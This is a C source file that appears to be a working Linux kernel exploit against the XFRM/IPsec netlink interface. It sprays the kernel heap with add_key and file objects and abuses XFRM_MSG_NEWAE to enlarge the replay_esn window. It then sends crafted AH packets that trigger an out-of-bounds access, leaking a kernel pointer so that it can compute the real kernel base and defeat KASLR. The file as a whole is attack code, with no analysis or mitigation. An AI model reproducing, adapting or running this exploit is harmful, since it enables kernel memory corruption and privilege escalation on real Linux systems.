#define _GNU_SOURCE

#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <stdarg.h>
#include <stdlib.h>
#include <stdbool.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/udp.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <linux/xfrm.h>
#include <linux/netlink.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <sched.h>
#include <sys/types.h>
#include <fcntl.h>
#include <pthread.h>
#include <time.h>
#include <assert.h>
#include <keyutils.h>

struct ip_auth_hdr {
	__u8	nexthdr;
	__u8	hdrlen;
	__be16	reserved;	/* big endian */
	__be32	spi;		/* big endian */
	__be32	seq_no;		/* big endian */
	__u8	auth_data[8];
};

#define MAX_PAYLOAD	2048
#define SPI		0x4149
#define RECV_PORT	13579

// send netlink message so as to configure SA and SP
int fd_xfrm_state;
int fd_victim_xfrm;
int fd_rop_xfrm;
int recvfd, sendfd;
FILE* fp[100];

int init_fd_xfrm_state(void) {
	int err;
	struct sockaddr_nl snl;

	memset(&snl, 0, sizeof(snl));
	snl.nl_family = PF_NETLINK;
	snl.nl_pid = 0;
	snl.nl_groups = 0;

	fd_xfrm_state = socket(PF_NETLINK, SOCK_RAW, NETLINK_XFRM);
	if (fd_xfrm_state == -1) {
		perror("socket fd_xfrm_state");
		return -1;
	}

	err = bind(fd_xfrm_state, (struct sockaddr *)&snl, sizeof(snl));
	if (err == -1) {
		close(fd_xfrm_state);
		return -1;
	}
	return 0;
}

int init_victim_fd(void) {
	int err;
	struct sockaddr_nl snl;

	memset(&snl, 0, sizeof(snl));
	snl.nl_family = PF_NETLINK;
	snl.nl_pid = 0;
	snl.nl_groups = 0;

	fd_victim_xfrm = socket(PF_NETLINK, SOCK_RAW, NETLINK_XFRM);
	if (fd_xfrm_state == -1) {
		perror("socket fd_xfrm_state");
		return -1;
	}

	err = bind(fd_victim_xfrm, (struct sockaddr *)&snl, sizeof(snl));
	if (err == -1) {
		close(fd_xfrm_state);
		return -1;
	}
	return 0;
}

void dump_nlmsg(char *buf) {
	int i = 0; // offset of replay_esn in message
	for (i = 0x188 ; i < (0x188 + 0x300 + 0x6*4); i++) {
		if ((i-0x188)%0x100 == 0)
			printf("\n");
		if (i%4 == 0) 
			printf ("\n0x%x\t", i);
		printf ("%02x", buf[i] & 0xff);
	}
	printf("\n");
}

void parse_file_structure(char *buf, unsigned f_op_offset) {
	// int f_op_offset = 0x3b7;  // offset of f_op from 
	fprintf(stdout, "without kASLR, the address of ext4_file_operations is:\n");
	fprintf(stdout, "0xffffffff82043840\n");
	fprintf(stdout, "address of ext4_file_operations:\n0x");
	fprintf(stdout, "%02x", buf[f_op_offset]&0xff);
	fprintf(stdout, "%02x", buf[f_op_offset-0x1]&0xff);
	fprintf(stdout, "%02x", buf[f_op_offset-0x2]&0xff);
	fprintf(stdout, "%02x", buf[f_op_offset-0x3]&0xff);
	fprintf(stdout, "%02x", buf[f_op_offset-0x4]&0xff);
	fprintf(stdout, "%02x", buf[f_op_offset-0x5]&0xff);
	fprintf(stdout, "%02x", buf[f_op_offset-0x6]&0xff);
	fprintf(stdout, "%02x\n", buf[f_op_offset-0x7]&0xff);
    
    uint64_t orig = 0xffffffff82043840;
    uint64_t new = 0ULL << 64;
    int i = 0x0;
    for (i = 0x0; i < 0x8; i++) {
        new = new | buf[f_op_offset - i]&0xff;
        if (i == 0x07)
            break;
        new = new << 8;
    }
    uint64_t offset = new - orig;
    fprintf(stdout, "offset is: 0x%x\n", offset);
    fprintf(stdout, "real kernel base address is : 0x%lx\n", offset + 0xffffffff80000000);
}

void parse_sa(char *buf) {
	dump_nlmsg(buf);
	parse_file_structure(buf, 0x3b7);
	return;
}

void parse_nlmsg(struct nlmsghdr* nlh, int msglen) {
	for (nlh; NLMSG_OK(nlh, msglen); nlh = NLMSG_NEXT(nlh, msglen)) {
		switch (nlh->nlmsg_type) {
			case XFRM_MSG_NEWSA:
			case XFRM_MSG_GETSA:
				return parse_sa((char*)nlh);
		}
	}
}

int get_xfrm_sa(int socket_fd, unsigned int spi) {
	int err;
	char buf[0x8000];
	struct sockaddr_nl snl;
	memset(&snl, 0, sizeof(snl));
	snl.nl_family = PF_NETLINK;
	snl.nl_pid = 0;
	snl.nl_groups = 0;
	
	struct msghdr mh;
	struct iovec iov;
	struct nlmsghdr *nlm = malloc(NLMSG_SPACE(MAX_PAYLOAD));
	memset(nlm, 0, NLMSG_SPACE(MAX_PAYLOAD));
	memset(&mh, 0, sizeof(mh));

	nlm->nlmsg_len = NLMSG_SPACE(MAX_PAYLOAD);
	nlm->nlmsg_pid = spi; // use spi directly for pid
	nlm->nlmsg_flags = NLM_F_REQUEST|NLM_F_DUMP;
	nlm->nlmsg_type = XFRM_MSG_GETSA;

	char *p = NULL;
	struct xfrm_usersa_id xid;
	memset(&xid, 0, sizeof(xid));
	xid.family = AF_INET;
	xid.proto = 0;
	xid.spi = spi;
	memcpy(NLMSG_DATA(nlm), &xid, sizeof(xid));
	p = NLMSG_DATA(nlm) + sizeof(xid);

	iov.iov_base = (void*)nlm;
	iov.iov_len = nlm->nlmsg_len;
	mh.msg_name = (void*)&snl;
	mh.msg_namelen = sizeof(snl);
	mh.msg_iov = &iov;
	mh.msg_iovlen = 1;

	err = sendmsg(socket_fd, &mh, 0);
	if (err == -1) {
		perror("sendmsg get_sa");
		free(nlm);
		return -1;
	}
	memset(buf, 0, sizeof(buf));
	iov.iov_base = (void*)buf;
	iov.iov_len = sizeof(buf);
	int msglen = recvmsg(socket_fd, &mh, 0);
	parse_nlmsg((struct nlmsghdr*)buf, msglen);
	return 0;
}

int alloc_xfrm_state(int socket_fd, unsigned int spi, unsigned int orig_bmp_len) {
	int err;

	struct sockaddr_nl snl;
	memset(&snl, 0, sizeof(snl));
	snl.nl_family = PF_NETLINK;
	snl.nl_pid = 0;			/* send to kernel */
	snl.nl_groups = 0;

	struct msghdr mh;
	struct iovec iov;
	struct nlmsghdr *nlm = malloc(NLMSG_SPACE(MAX_PAYLOAD));
	memset(nlm, 0, NLMSG_SPACE(MAX_PAYLOAD));
	memset(&mh, 0, sizeof(mh));

	/* nlmsghdr */
	nlm->nlmsg_len = NLMSG_SPACE(MAX_PAYLOAD);
	nlm->nlmsg_pid = spi; // use spi directly for nlmsg_pid
	nlm->nlmsg_flags = NLM_F_REQUEST;
	nlm->nlmsg_type = XFRM_MSG_NEWSA; 

	char *p = NULL;
	/* DATA: xfrm_usersa_info structure */
	struct xfrm_usersa_info xui;
	memset(&xui, 0, sizeof(xui));
	xui.family = AF_INET;
	xui.id.proto = IPPROTO_AH;
	xui.id.spi = spi;
	xui.id.daddr.a4 = inet_addr("127.0.0.1");
	xui.lft.hard_byte_limit = 0x10000000;
	xui.lft.hard_packet_limit = 0x10000000;
	xui.lft.soft_byte_limit = 0x1000;
	xui.lft.soft_packet_limit = 0x1000;
	xui.mode = XFRM_MODE_TRANSPORT;
	xui.flags = XFRM_STATE_ESN;
	memcpy(NLMSG_DATA(nlm), &xui, sizeof(xui));
	p = NLMSG_DATA(nlm) + sizeof(xui);

	/* ATTR: xfrm_alg_auth */
	struct nlattr nla;
	struct xfrm_algo xa;
	memset(&nla, 0, sizeof(nla));
	memset(&xa, 0, sizeof(xa));
	nla.nla_len = sizeof(xa) + sizeof(nla);
	nla.nla_type = XFRMA_ALG_AUTH;
	strcpy(xa.alg_name, "digest_null");
	xa.alg_key_len = 0;
	memcpy(p, &nla, sizeof(nla));
	p += sizeof(nla);
	memcpy(p, &xa, sizeof(xa));
	p += sizeof(xa);

	/* ATTR: xfrm_replay_esn_val */
	struct xfrm_replay_state_esn rs;
	char bmp[orig_bmp_len*sizeof(unsigned int)*8];
	memset(&rs, 0, sizeof(rs));
	memset(&nla, 0, sizeof(nla));
	memset(bmp, 'A', orig_bmp_len*sizeof(unsigned int)*8);

	nla.nla_len = sizeof(nla) + sizeof(rs) + orig_bmp_len*sizeof(unsigned int)*8;
	// create a replay_state_esn structure
	nla.nla_type = XFRMA_REPLAY_ESN_VAL;
	rs.replay_window = orig_bmp_len;
	rs.bmp_len = orig_bmp_len;
	memcpy(p, &nla, sizeof(nla));
	p += sizeof(nla);
	memcpy(p, &rs, sizeof(rs));
	p += sizeof(rs);
	memcpy(p, bmp, orig_bmp_len*sizeof(unsigned int)*8);

	/* prepare to sendmsg */
	iov.iov_base = (void *)nlm;
	iov.iov_len = nlm->nlmsg_len;
	mh.msg_name = (void *)&snl;
	mh.msg_namelen = sizeof(snl);
	mh.msg_iov = &iov;
	mh.msg_iovlen = 1;

	err = sendmsg(socket_fd, &mh, 0);
	if (err == -1) {
		perror("sendmsg alloc_xfrm_state");
		free(nlm);
		return -1;
	}
	return 0;
}
// allocate a bunch of struct file to kmalloc-256
// expected that 
// |replay_esn 1|replay_esn 2|replay_esn 3|replay_esn 4|file|
// files are generated by generate_file.h
int alloc_file() {
	int i = 0;
	char filename[10];
	memset(filename, 0, 10);
	for (i = 0; i < 100; i++) {
		sprintf(filename, "test%d", i);
		fp[i] = fopen(filename, "w");
		while(fp == NULL) {
			perror("alloc_file\n");
			return 1;
		}
	}
	return 0;
}

int update_esn(unsigned int spi, unsigned int orig_bmp_len,
	       unsigned int window, unsigned int seq, unsigned int seq_hi)
{
	struct sockaddr_nl snl;
	memset(&snl, 0, sizeof(snl));
	snl.nl_family = PF_NETLINK;
	snl.nl_pid = 0;
	snl.nl_groups = 0;

	struct nlmsghdr *nlm = malloc(NLMSG_SPACE(MAX_PAYLOAD));
	struct msghdr mh;
	struct iovec iov;

	memset(nlm, 0, NLMSG_SPACE(MAX_PAYLOAD));
	memset(&mh, 0, sizeof(mh));

	nlm->nlmsg_len = NLMSG_SPACE(MAX_PAYLOAD);
	nlm->nlmsg_pid = spi; //use spi directly for pid
	nlm->nlmsg_flags = NLM_F_REQUEST | NLM_F_REPLACE;
	// corresponding handler is xfrm_new_ae
	// in which, no strict checking exists
	nlm->nlmsg_type = XFRM_MSG_NEWAE;

	char *p = NULL;
	/* DATA: xfrm_aevent_id structure */
	struct xfrm_aevent_id xai;
	memset(&xai, 0, sizeof(xai));
	xai.sa_id.proto = IPPROTO_AH;
	xai.sa_id.family = AF_INET;
	xai.sa_id.spi = spi;
	xai.sa_id.daddr.a4 = inet_addr("127.0.0.1");
	memcpy(NLMSG_DATA(nlm), &xai, sizeof(xai));
	p = NLMSG_DATA(nlm) + sizeof(xai);

	/* ATTR: xfrma_replay_esn_val */
	struct nlattr nla;
	struct xfrm_replay_state_esn rs;
	char bmp[orig_bmp_len*sizeof(unsigned int)*8];
	memset(&nla, 0, sizeof(nla));
	memset(&rs, 0, sizeof(rs));
	memset(bmp, 'A', orig_bmp_len*sizeof(unsigned int)*8);

	nla.nla_len = sizeof(nla) + sizeof(rs) + orig_bmp_len*sizeof(unsigned int)*8;
	nla.nla_type = XFRMA_REPLAY_ESN_VAL;
	// changed the value of window
	rs.replay_window = window;
	rs.bmp_len = orig_bmp_len;
	rs.seq_hi = seq_hi;
	rs.seq = seq;

	memcpy(p, &nla, sizeof(nla));
	p += sizeof(nla);
	memcpy(p, &rs, sizeof(rs));
	p += sizeof(rs);
	memcpy(p, bmp, orig_bmp_len*sizeof(unsigned int)*8);

	/* sendmsg */
	iov.iov_base = (void *)nlm;
	iov.iov_len = nlm->nlmsg_len;
	mh.msg_name = (void *)&snl;
	mh.msg_namelen = sizeof(snl);
	mh.msg_iov = &iov;
	mh.msg_iovlen = 1;

	int err = sendmsg(fd_xfrm_state, &mh, 0);
	if (err == -1) {
		perror("sendmsg update_esn");
		free(nlm);
		return -1;
	}
	return 0;
}

int init_recv_fd(void) {
	recvfd = socket(AF_INET, SOCK_RAW, IPPROTO_AH);
	if (recvfd == -1) {
		perror("socket init_recv_fd");
		return -1;
	}
	struct sockaddr_in sai;
	memset(&sai, 0, sizeof(sai));
	sai.sin_addr.s_addr = inet_addr("127.0.0.1");
	sai.sin_port = htons(RECV_PORT);
	sai.sin_family = AF_INET;

	int err = bind(recvfd, (struct sockaddr *)&sai, sizeof(sai));
	if (err == -1) {
		perror("bind init_recv_fd");
		close(recvfd);
		return -1;
	}
	return 0;
}

int init_send_fd(void) {
	sendfd = socket(AF_INET, SOCK_RAW, IPPROTO_AH);
	if (sendfd == -1) {
		perror("socket init_send_fd");
		return -1;
	}
	return 0;
}

// use add_key for defragment
// add_key will allocate two objects in one call
// one is struct key in size of 192 (0xc0)
// one is in sizeof(payload)+0x18
void defragment() {
	int i = 0;
	char type[5] = "user";
	char* description = (char*)malloc(sizeof(char)*4);
	char* payload = (char*)malloc(sizeof(char)*0x100-0x18); // 256
	memset(payload, 'A', 0x100-0x18-0x1);
	for (i = 0; i < 0x600 ; i++) {
		key_serial_t key;
		sprintf(description, "%d", i);
		key = add_key(type, description, payload, strlen(payload), KEY_SPEC_USER_KEYRING);
		if (key == -1) {
			perror("add_key");
			exit(0);
		}
	}
}

int trigger_oob(unsigned int spi, unsigned int seq)
{
	struct sockaddr_in sai;
	memset(&sai, 0, sizeof(sai));
	sai.sin_addr.s_addr = inet_addr("127.0.0.1");
	sai.sin_port = htons(RECV_PORT);
	sai.sin_family = AF_INET;

	struct msghdr mh;
	struct iovec iov;
	memset(&mh, 0, sizeof(mh));

	char buf[4096];
	memset(buf, 0x41, sizeof(buf));

	struct ip_auth_hdr iah;
	memset(&iah, 0, sizeof(iah));
	iah.spi = spi;
	iah.nexthdr = 1;
	iah.seq_no = seq;
	iah.hdrlen = (0x10 >> 2) - 2;

	char *p = buf;

	memcpy(p, &iah, sizeof(iah));
	p += sizeof(iah);

	iov.iov_base = buf;
	iov.iov_len = 4096;
	mh.msg_name = (void *)&sai;
	mh.msg_namelen = sizeof(sai);
	mh.msg_iov = &iov;
	mh.msg_iovlen = 1;

	int err = sendmsg(sendfd, &mh, 0);
	if (err == -1) {
		perror("sendmsg sendfd");
		return -1;
	}

	recv(recvfd, buf, 4096, 0);

	return 0;
}

static bool write_file(const char* file, const char* what, ...)
{
    char buf[1024];
    va_list args;
    va_start(args, what);
    vsnprintf(buf, sizeof(buf), what, args);
    va_end(args);
    buf[sizeof(buf) - 1] = 0;
    int len = strlen(buf);

    int fd = open(file, O_WRONLY | O_CLOEXEC);
    if (fd == -1)
        return false;
    if (write(fd, buf, len) != len) {
        close(fd);
        return false;
    }
    close(fd);
    return true;
}

void setup_sandbox() {
	int real_uid = getuid();
	int real_gid = getgid();		

	if (unshare(CLONE_NEWUSER) != 0) {
		perror("unshare(CLONE_NEWUSER)");
		exit(EXIT_FAILURE);
	}

	if (unshare(CLONE_NEWNET) != 0) {
		perror("unshare(CLONE_NEWNET)");
		exit(EXIT_FAILURE);
	}
    if (!write_file("/proc/self/setgroups", "deny")) {
        perror("write_file(/proc/self/set_groups)");
        exit(EXIT_FAILURE);
    }
    if (!write_file("/proc/self/uid_map", "0 %d 1\n", real_uid)){
        perror("write_file(/proc/self/uid_map)");
        exit(EXIT_FAILURE);
    }
    if (!write_file("/proc/self/gid_map", "0 %d 1\n", real_gid)) {
        perror("write_file(/proc/self/gid_map)");
        exit(EXIT_FAILURE);
    }

    cpu_set_t my_set;
    CPU_ZERO(&my_set);
    CPU_SET(0, &my_set);
    if (sched_setaffinity(0, sizeof(my_set), &my_set) != 0) {
        perror("sched_setaffinity()");
        exit(EXIT_FAILURE);
    }

    if (system("/sbin/ifconfig lo up") != 0) {
        perror("system(/sbin/ifconfig lo up)");
        exit(EXIT_FAILURE);
    }

    printf("[.] namespace sandbox setup successfully\n");	
}

int main(int argc, char *argv[]) {
    
    /************** context **************/

	setup_sandbox();
	int err;
	if (argc != 2) {
		fprintf(stderr, "%s spi\n", argv[0]);
		return -1;
	}
	unsigned int spi = atoi(argv[1]); // security parameter idx, will be used in IPsec packet
	unsigned int orig_bmp_len = 0x30;
	
	err = init_fd_xfrm_state();
	if (err == -1) {
		fprintf(stderr, "init_fd_xfrm_state err\n");
		return -1;
	}

	err = init_recv_fd();
	if (err == -1) {
		fprintf(stderr, "init_recv_fd err\n");
		return -1;
	}

	err = init_send_fd();
	if (err == -1) {
		fprintf(stderr, "init_send_fd err\n");
		return -1;
	}

	err = init_victim_fd();
	if (err == -1) {
		fprintf(stderr, "init_victim_fd err\n");
		return -1;
	}

	defragment(); // fill holes in kmalloc-256
	fprintf(stdout, "defragmented\n");

	// create replay_state_esn structure
	err = alloc_xfrm_state(fd_xfrm_state, spi, orig_bmp_len);
	if (err == -1) {
		fprintf(stderr, "alloc_xfrm_state err\n");
		return -1;
	}

	err = alloc_file();
	if (err == -1) {
		fprintf (stderr, "alloc_file err\n");
		return -1;
	}

    unsigned int window = 0x1001; // new window value ((0x100-0x6*4+0x100+0x2*4)/4) << 5 + 1
    // unsigned int seq = 0xf40; // (0x100-0x6*4+0x100)<<3
    unsigned int seq = 0xfc0; // (0x100-0x6*4+0x100+16)<<3
    unsigned int seq_hi = 1;
    // change window value
    err = update_esn(spi, orig_bmp_len, window, seq, seq_hi);
    if (err == -1) {
        fprintf(stderr, "update_esn err\n");
        return -1;
    }

    /************** overwrite **************/

    // specifies the sequence number
    // 1UL << (0x1f4a - 0x1f42) + 1UL << (0x1f4b - 0x1f42)
    // leak 0x300 bytes
    trigger_oob(spi, htonl(0x1fca)); // (seq-1)%window >> 5 = (0x100-0x6*4+0x100+16)/4
    trigger_oob(spi, htonl(0x1fcb)); // (seq-1)%window >> 5 = (0x100-0x6*4+0x100+16)/4
    fprintf(stderr, "triggerred\n");
    sleep(2);

	return 0;
}
